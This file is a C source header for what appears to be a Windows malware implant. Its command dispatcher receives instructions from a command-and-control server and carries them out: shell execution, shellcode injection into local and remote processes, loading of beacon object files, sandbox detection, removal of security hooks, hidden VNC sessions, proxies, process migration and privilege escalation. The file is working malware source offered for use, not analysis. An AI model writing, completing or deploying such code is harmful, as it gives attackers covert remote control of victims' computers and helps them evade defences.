#ifndef COMMANDS_INCLUDED
#define COMMANDS_INCLUDED
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "datatypes.h"
#include "utils/winexec.h"
#include "hackmods/sandbox.h"
#include "hackmods/injectors.h"
#include "hackmods/bof.h"
#include "hackmods/unhook.h"
#include "hackmods/critlib.h"
#include "hackmods/privesc.h"
#include "vnc/vnc.h"
#include "vnc/hvnc.h"
#include "utils/desktops.h"
#include "modules/proxy.h"
#include "migrate.h"
#include "utils/ps.h"
#define pstr(x) printf("len=%d, data=%.*s\n", x.len, x.len, x.data)
#define fs(x) free(x.data)

enum Opcodes{
    PRINT, //1//print [text]
    MSGBOX, //2//msgbox [title] [content]
    POPINT, //0
    CONSUME, //0
    EXEC, //r1//exec [command]
    EXIT, //0
    SLEEP, //1//sleep [time, ms]
    LOCAL_SHC, //1//local_shc [shellcode]
    LOCAL_SHC_RWX, //1//local_shc_rwx [shellcode]
    SANDBOX, //r0//detects sandbox
    REMOTE_SHC_PNAME, //3//remote_shc_pname [processname] [shellcode] [use rwx]
    REMOTE_SHC_PID, //3//remote_shc_pid [pid] [shellcode] [use rwx]
    SHC_INJECT_APC, //3//shc_inject_apc [processname] [shellcode] [use rwx]
    BOF_EXECUTE, //1//bof_execute file([bof file])
    SWAP_C2, //?//swap_c2 [c2 method] ... [poll interval]
    UNHOOK, //0//auto remove hooks
    VNC, //2//vnc [ip] [port]
    HVNC, //2//hvnc [ip] [port]
    CRITICAL, //1//critical [true/false]
    ENUMDESKTOPS, //0
    SETWINSTA, //1//setwinsta [station]
    SETTHDDSK, //1//setthddsk [desktop]
    GETTHDDSK, //0
    PUSHINT, //0
    PUSHSTR, //0
    PROXY, //2//proxy [ip] [port]
    KILLPROXY, //1//killproxy [id]
    MIGRATE, //1//migrate [pid]
    PS, //0//list processes
    CURRENTPID, //0
    CHECKADMIN, //0
    PRIVESC, //0
};

int parse(int mnem, unsigned char** sp, C2* conn){
    if(mnem == MSGBOX){
        String title = popstr(sp);
        String body = popstr(sp);
        MessageBoxA(NULL, body.data, title.data, MB_OK);
        fs(title);
        fs(body);
    }else if(mnem == CONSUME){
        String str = popstr(sp);
        fs(str);
    }else if(mnem == EXEC){
        String in = popstr(sp);
        String out;
        out.data = calloc(10000, 1);
        out.len = exec(in.data, out.data, in.len);
        pushstr(out, sp);
        fs(in);
        fs(out);
    }else if(mnem == SLEEP){
        Sleep(popint(sp));
    }else if(mnem == LOCAL_SHC){
        String shc = popstr(sp);
        void *exec = VirtualAlloc(0, shc.len, MEM_COMMIT, PAGE_READWRITE);
        memcpy(exec, shc.data, shc.len);
        DWORD old;
        VirtualProtect(exec, shc.len, PAGE_EXECUTE_READ, &old);
        CreateThread(NULL, 0, exec, NULL, 0, NULL);
    }else if (mnem == LOCAL_SHC_RWX){
        String shc = popstr(sp);
        void *exec = VirtualAlloc(0, shc.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, shc.data, shc.len);
        CreateThread(NULL, 0, exec, NULL, 0, NULL);
    }else if(mnem == SANDBOX){
        String out;
        out.data = calloc(500, 1);
        sanddetect(out.data);
        out.len = strlen(out.data);
        pushstr(out, sp);
    }else if(mnem == REMOTE_SHC_PNAME){
        String name = popstr(sp);
        String shc = popstr(sp);
        injectProcess(name.data, shc.data, shc.len, popint(sp));
        fs(name);
        fs(shc);
    }else if(mnem == REMOTE_SHC_PID){
        int pid = popint(sp);
        String shc = popstr(sp);
        injectPid(pid, shc.data, shc.len, popint(sp));
        fs(shc);
    }else if(mnem == SHC_INJECT_APC){
        String name = popstr(sp);
        String shc = popstr(sp);
        injectAPC(name.data, shc.data, shc.len, popint(sp));
        fs(name);
        fs(shc);
    }else if(mnem == BOF_EXECUTE){
        String data = popstr(sp);
        loadBOF(data.data, data.len, conn);
    }else if(mnem == UNHOOK){
        unhook();
    }else if(mnem == VNC){
        String data = popstr(sp);
        NETWORK* net = calloc(sizeof(NETWORK), 1);
        net->ip = data.data;
        net->port = popint(sp);
        
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)vncspawn, net, 0, NULL);
    }else if(mnem == HVNC){
        String data = popstr(sp);
        NETWORK* net = calloc(sizeof(NETWORK), 1);
        net->ip = data.data;
        net->port = popint(sp);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hvnc, net, 0, NULL);
    }else if(mnem == PROXY){
        String data = popstr(sp);
        PROXOBJ* net = calloc(sizeof(PROXOBJ), 1);
        net->ip = data.data;
        net->port = popint(sp);
        int i = 0;
        net->alive = gethole(&i);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)newproxy, net, 0, NULL);
        char datum[100] = {0};
        sprintf(datum, "Spawned proxy #%d!", i);
        sendC2(*conn, datum, strlen(datum));
    }else if(mnem == CRITICAL){
        setCritical(popint(sp));
    }else if(mnem == ENUMDESKTOPS){
        getdesktops();
        char desks[1000] = {0};
        for(int i=0;i<(sizeof(desktops)/sizeof(char*));i++){
            if(desktops[i]!=0){
                strcat(desks, desktops[i]);
                desks[strlen(desks)] = '\n';
            }
        }
        sendC2(*conn, desks, strlen(desks));
    }else if(mnem == SETWINSTA){
        String data = popstr(sp);
        setWinSta(data.data);
        fs(data);
    }else if(mnem == SETTHDDSK){
        String data = popstr(sp);
        memset(current_dsk, 0, MAX_PATH);
        memcpy(current_dsk, data.data, data.len);
        setThdDsk();
        fs(data);
    }else if(mnem == GETTHDDSK){
        getcurrdesktop();
        sendC2(*conn, current_dsk, strlen(current_dsk));
    }else if(mnem == KILLPROXY){
        proxies[popint(sp)] = 0;
    }else if(mnem == MIGRATE){
        migrate(popint(sp));
    }else if(mnem == PS){
        char* data = enumProcesses();
        sendC2(*conn, data, strlen(data));
        free(data);
    }else if(mnem == CURRENTPID){
        char data[100] = {0};
        sprintf(data, "PID: %d", GetCurrentProcessId());
        sendC2(*conn, data, strlen(data));
    }else if(mnem == CHECKADMIN){
	    // Get current image's base address
	    char data[100] = {0};
	    if(IsProcessElevated()){
            strcpy(data, "Admin privs present!");
        }else{
            strcpy(data, "Not admin");
        }
        sendC2(*conn, data, strlen(data));
    }else if(mnem == PRIVESC){
        if(!IsProcessElevated())
            privesc();
    }else{
        return 1;
    }
    return 0;
}
#endif